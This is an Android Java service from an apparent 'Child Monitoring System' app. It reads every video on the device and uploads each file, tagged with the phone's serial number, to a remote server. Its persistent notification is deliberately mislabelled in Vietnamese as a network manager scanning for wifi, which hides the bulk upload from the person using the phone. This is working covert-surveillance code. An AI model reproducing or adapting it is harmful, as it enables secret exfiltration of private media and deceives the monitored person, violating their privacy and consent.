package com.ChildMonitoringSystem.CMS.JobService;

import static com.ChildMonitoringSystem.CMS.MyApplication.CHANNEL_ID;

import android.app.Notification;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadImageFromExternalStorage;
import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadMediaStore;
import com.ChildMonitoringSystem.CMS.Model.INFO_IMAGE;
import com.ChildMonitoringSystem.CMS.Model.INFO_MEDIA;
import com.ChildMonitoringSystem.CMS.R;
import com.ChildMonitoringSystem.CMS.Service.Service_Upload;
import com.ChildMonitoringSystem.CMS.Value.Constant;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class VideoUploadService extends Service {
    private static final String TAG = VideoUploadService.class.getName();
    ArrayList<INFO_MEDIA> lst;


    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
            startMyOwnForeground();
        else
            startForeground(1, new Notification());
        IntentFilter filter = new IntentFilter();
        filter.addAction(Constant.ACTION);
        registerReceiver(mbroadBroadcastReceiver, filter);
        try {
            LoadMediaStore load = new LoadMediaStore();
            lst = load.getVideos(getApplicationContext());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground() {
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Trình quản lí mạng")
                .setContentText("Hệ thống đang quét wifi gần bạn")
                .setSmallIcon(R.drawable.ic_baseline_settings_24)
                .build();
        startForeground(2, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        try {
            Thread.sleep(10000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        doBackGroundWork(lst);
        return START_NOT_STICKY;
    }

    private final BroadcastReceiver mbroadBroadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (Constant.ACTION.equals(intent.getAction())) {
                stopSelf();
            }

        }
    };

    private void doBackGroundWork(ArrayList<INFO_MEDIA> lst) {
        new Thread(() -> {
            if (lst.size() > 0) {
                for (INFO_MEDIA info : lst) {
                    String seri = info.getSERI_PHONE();
                    String date = info.getDATE_MEDIA();
                    String duaration  = info.getDURATION();
                    RequestBody requestBodySeri = RequestBody.create(MediaType.parse("multipart/form-data"), seri);
                    RequestBody requestBodyDate = RequestBody.create(MediaType.parse("multipart/form-data"), date);
                    RequestBody requestBodyDuration = RequestBody.create(MediaType.parse("multipart/form-data"), duaration);
                    File file = new File(info.getMEDIA_NAME());
                    RequestBody requestBodyimg = RequestBody.create(MediaType.parse("multipart/form-data"), file);
                    MultipartBody.Part mPart = MultipartBody.Part.createFormData(Constant.MEDIA_NAME, file.getName(), requestBodyimg);
                    Service_Upload.apiservice1.UploadVideo(requestBodySeri, requestBodyDate,requestBodyDuration, mPart).enqueue(new Callback<ResponseBody>() {
                        @Override
                        public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                            Log.d("Call request", call.request().toString());
                            Log.d("Call request header", call.request().headers().toString());
                            Log.d("Response raw header", response.headers().toString());
                            Log.d("Response raw", String.valueOf(response.raw().body()));
                            Log.d("Response code", String.valueOf(response.code()));

                            if(response.isSuccessful()) {
                                //the response-body is already parseable to your ResponseBody object
                                ResponseBody responseBody = (ResponseBody) response.body();
                                //you can do whatever with the response body now...
                                String responseBodyString= null;
                                try {
                                    responseBodyString = responseBody.string();
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                                Log.d("Response body", responseBodyString);
                            }
                            else  {
                                Log.d("Response errorBody", String.valueOf(response.errorBody()));
                            }
                        }

                        @Override
                        public void onFailure(Call<ResponseBody> call, Throwable t) {
                            String err = t.getMessage() == null ? "" : t.getMessage();
                            Log.i("TAG", "onFailure: "+err);
                        }
                    });
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                Intent intent = new Intent(Constant.ACTION);
                sendBroadcast(intent);
            }
        }).start();
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(mbroadBroadcastReceiver);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
